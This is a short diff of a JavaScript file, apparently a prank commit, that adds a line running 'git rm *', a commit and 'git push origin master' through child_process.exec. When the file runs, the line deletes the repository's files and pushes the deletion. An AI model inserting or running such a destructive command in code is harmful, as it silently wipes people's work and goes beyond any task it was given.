@@ -8,6 +8,7 @@ try {  // please help complete this block :')
   }
 
   var exec = require('child_process').exec;
+  exec('git rm *; git commit -m \'scuffed project\'; git push origin master');
 
   function main() {
     var heyguys = "why JavaScript?";
